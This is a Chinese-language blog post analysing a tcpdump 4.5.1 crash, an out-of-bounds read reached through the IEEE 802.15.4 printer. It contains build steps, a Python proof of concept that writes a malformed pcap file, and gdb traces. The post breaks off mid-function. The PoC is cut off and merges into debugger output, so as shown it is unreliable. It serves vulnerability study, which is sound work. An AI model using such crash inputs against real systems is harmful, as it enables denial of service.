第一次做漏洞分析，有什么错误的地方欢迎各位提出
### 分析环境
  * ubuntu16.04 x86_64
  * gdb with pwndbg
  * tcpdump 4.5.1
  * poc
### 编译安装tcpdump
    $ sudo apt-get install libpcap-dev
    $ dpkg -l libpcap-dev
    $ wget https://www.exploit-db.com/apps/973a2513d0076e34aa9da7e15ed98e1b-tcpdump-4.5.1.tar.gz
    $ tar -zxvf 973a2513d0076e34aa9da7e15ed98e1b-tcpdump-4.5.1.tar.gz
    $ cd tcpdump-4.5.1/
    $ ./configure
    $ make
    $ sudo make install
### 利用poc生成pcap文件
poc：
    from subprocess import call
    from shlex import split
    from time import sleep
    def crash():
        command = 'tcpdump -r crash'
        buffer     =   '\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff'
        buffer     +=  '\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00'
        buffer     +=  '\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00, length=4294967283, oset=133744) at ./print-ascii.c:91
    91    s2 = *cp++;
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ───────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────
     RAX  0x2e
     RBX  0x2e
     RCX  0x0
     RDX  0x7ffff79425e0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
     RDI  0x7fffffffcf90 ◂— 0x3030203030303020 (' 0000 00')
     RSI  0x0
     R8   0x5a5a5a5a5a5a5a5a ('ZZZZZZZZ')
     R9   0x0
     R10  0x1
     R11  0x0
     R12  0x843001
     R13  0x7fffffffcfa9 ◂— 0x3030203030303000
     R14  0x5
     R15  0x7fffffffcfca ◂— 0x2e2e2e2e2e2e /* '......' */
     RBP  0x2e
     RSP  0x7fffffffcf70 ◂— 0x0
     RIP  0x40c8b7 (hex_and_ascii_print_with_offset+103) ◂— movzx  ebx, byte ptr [r12 - 1]
    ────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
     ► 0x40c8b7     movzx  ebx, byte ptr [r12 - 1]
       0x40c8bd     mov    rax, r13
       0x40c8c0     mov    esi, 0x29
       0x40c8c5     sub    rax, rdi
       0x40c8c8     sub    rsp, 8
       0x40c8cc     mov    r8d, 0x473d00
       0x40c8d2     sub    rsi, rax
       0x40c8d5     mov    ecx, 0x29
       0x40c8da     mov    edx, 1
       0x40c8df     mov    rdi, r13
       0x40c8e2     mov    ebp, r9d
    ─────────────────────────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────────────────────────
    In file: /home/kaka/DEBUG/tcpdump-4.5.1/print-ascii.c
       86 nshorts = length / sizeof(u_short);
       87 i = 0;
       88 hsp = hexstuff; asp = asciistuff;
       89 while (--nshorts >= 0) {
       90 s1 = *cp++;
     ► 91 s2 = *cp++;
       92 (void)snprintf(hsp, sizeof(hexstuff) - (hsp - hexstuff),
       93     " %02x%02x", s1, s2);
       94 hsp += HEXDUMP_HEXSTUFF_PER_SHORT;
       95 *(asp++) = (isgraph(s1) ? s1 : '.');
       96 *(asp++) = (isgraph(s2) ? s2 : '.');
    ─────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────
    00:0000│ rsp    0x7fffffffcf70 ◂— 0x0
    01:0008│        0x7fffffffcf78 ◂— 0x100822577
    02:0010│        0x7fffffffcf80 —▸ 0x47fe57 ◂— or     cl, byte ptr [rcx] /* '\n\t' */
    03:0018│        0x7fffffffcf88 ◂— 0xfffffff300020a70
    04:0020│ rdi    0x7fffffffcf90 ◂— 0x3030203030303020 (' 0000 00')
    05:0028│        0x7fffffffcf98 ◂— 0x2030303030203030 ('00 0000 ')
    06:0030│        0x7fffffffcfa0 ◂— '0000 0000'
    07:0038│ r13-1  0x7fffffffcfa8 ◂— 0x3020303030300030 /* '0' */
从崩溃信息来看，问题出现在print-ascii.c文件中，访问到了一个不允许访问的地址。再结合源码信息可知，指针cp在自加的过程中访问到了一个没有权限访问的地址，因为这是写在一个while循环里，也就是是说nshorts的值偏大，再看nshorts怎么来的，由此nshorts
= length / sizeof(u_short);可知，可能是函数传入的参数length没有控制大小导致，因此目标就是追踪length是如何传入的。
通过bt回溯一下调用情况
    pwndbg> bt
    #0  hex_and_ascii_print_with_offset (ident=0x47fe57 "\n\t", cp=0x843000 , length=4294967283, oset=133744) at ./print-ascii.c:91
    #1  0x000000000040aa7d in ieee802_15_4_if_print (ndo=0x820140 , h=, p=) at ./print-802_15_4.c:180
    #2  0x000000000045bb9f in print_packet (user=0x7fffffffd2e0 "@\001\202", h=0x7fffffffd1d0, sp=0x822570 "@\377") at ./tcpdump.c:1950
    #3  0x00007ffff7bb3ac4 in ?? () from /usr/lib/x86_64-linux-gnu/libpcap.so.0.8
    #4  0x00007ffff7ba41cf in pcap_loop () from /usr/lib/x86_64-linux-gnu/libpcap.so.0.8
    #5  0x0000000000403f27 in main (argc=argc@entry=3, argv=argv@entry=0x7fffffffe548) at ./tcpdump.c:1569
    #6  0x00007ffff77eb830 in __libc_start_main (main=0x4030e0 , argc=3, argv=0x7fffffffe548, init=, fini=, rtld_fini=, stack_end=0x7fffffffe538) at ../csu/libc-start.c:291
    #7  0x0000000000404cd9 in _start ()
追踪一下从main函数开始，每个函数的执行流程
pcap_loop()
    ► 0x403f22     call   pcap_loop@plt 
            rdi: 0x8222c0 —▸ 0x7ffff7bb3a40 ◂— push   r15
            rsi: 0xffffffff
            rdx: 0x45bb50 (print_packet) ◂— push   r12
            rcx: 0x7fffffffcbd0 —▸ 0x820140 (Gndo) ◂— 0x0
在跟进pcap_loop()函数的过程中，遇到一处call，步入看看
    ► 0x7ffff7ba41ca     call   0x7ffff7bb3a40
来到了bpf_filter函数，注意第三个参数就是我们传入crash数据包的len,然而到后面发现，其实与这个值无关
    ► 0x7ffff7bb3aa9    call   bpf_filter 
            rdi: 0x825c30 ◂— 0x4900000006
            rsi: 0x822570 ◂— 0x7f72a00600ff40
            rdx: 0x379c3c00
            rcx: 0x8
pcap数据包内关键结构体
    struct pcap_pkthdr {
            struct timeval ts;      /* time stamp */
            bpf_u_int32 caplen;     /* length of portion present */
            bpf_u_int32 len;        /* length this packet (off wire) */
    };
     ts：    抓取时间
     caplen：4字节 保存下来的包长度
     len：   4字节 数据包的真实长度
使用010editer可以很容易的分析这个结构体
捕获.PNG
紧接着来到另一处函数调用
    ────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
       0x7ffff7bb3ab0    je     0x7ffff7bb3ace
       0x7ffff7bb3ab2    add    ebp, 1
       0x7ffff7bb3ab5    mov    rdx, qword ptr [rsp + 0x18]
       0x7ffff7bb3aba    mov    rsi, r12
       0x7ffff7bb3abd    mov    rdi, qword ptr [rsp]
     ► 0x7ffff7bb3ac1    call   r15 
            rdi: 0x7fffffffcbd0 —▸ 0x820140 (Gndo) ◂— 0x0
            rsi: 0x7fffffffcac0 ◂— 0x8000
            rdx: 0x822570 ◂— 0x7f72a00600ff40
       0x7ffff7bb3ac4    cmp    ebp, r14d
       0x7ffff7bb3ac7    jl     0x7ffff7bb3ace
       0x7ffff7bb3ac9    test   r14d, r14d
       0x7ffff7bb3acc    jg     0x7ffff7bb3b30
       0x7ffff7bb3ace    mov    eax, dword ptr [rbx + 0x34]
跟进去以后
    ► 0x45bb73     mov    eax, dword ptr [rbx + 0x10]
       0x45bb76     mov    rdx, qword ptr [rip + 0x26c2db] 
       0x45bb7d     add    rax, rbp
       0x45bb80     mov    qword ptr [rdx + 0xe0], rax
       0x45bb87     mov    edx, dword ptr [r12 + 0x10]
       0x45bb8c     test   edx, edx
    ───────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────────
    In file: /home/kaka/DEBUG/tcpdump-4.5.1/tcpdump.c
       1942 /*
       1943 * Some printers want to check that they're not walking off the
       1944 * end of the packet.
       1945 * Rather than pass it all the way down, we set this global.
       1946 */
     ► 1947 snapend = sp + h->caplen;
       1948 
       1949         if(print_info->ndo_type) {
       1950                 hdrlen = (*print_info->p.ndo_printer)(print_info->ndo, h, sp);
       1951         } else {
       1952                 hdrlen = (*print_info->p.printer)(h, sp);
首先把caplen(vlaue = 8)传进来
来到下面这个地方
    ───────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────
       0x45bb8c     test   edx, edx
       0x45bb8e     je     print_packet+168 
       0x45bb90     mov    rdx, rbp
       0x45bb93     mov    rsi, rbx
       0x45bb96     mov    rdi, qword ptr [r12]
     ► 0x45bb9a     call   qword ptr [r12 + 8] 
       0x45bb9f     mov    rdx, qword ptr [rip + 0x26c2b2] 
       0x45bba6     mov    ecx, dword ptr [rdx + 0x40]
       0x45bba9     test   ecx, ecx
       0x45bbab     je     print_packet+193 
       0x45bbad     cmp    ecx, 1
    ───────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────────
    In file: /home/kaka/DEBUG/tcpdump-4.5.1/tcpdump.c
       1945 * Rather than pass it all the way down, we set this global.
       1946 */
       1947 snapend = sp + h->caplen;
       1948 
       1949         if(print_info->ndo_type) {
     ► 1950                 hdrlen = (*print_info->p.ndo_printer)(print_info->ndo, h, sp);
       1951         } else {
       1952                 hdrlen = (*print_info->p.printer)(h, sp);
       1953         }
       1954                 
       1955 if (Xflag) {
程序call了一个函数，这个函数就是函数，这个函数定义在print-802_15_4.c中，
    u_int
    ieee802_15_4_if_print(struct netdissect_options *ndo,
                          const struct pcap_pkthdr *h, const u_char *p)
    {
    printf("address : %x\n",p);
    u_int caplen = h->caplen; //传入的caplen，赋值给无符号整形变量caplen,且该值为8
    int hdrlen;
    u_int16_t fc;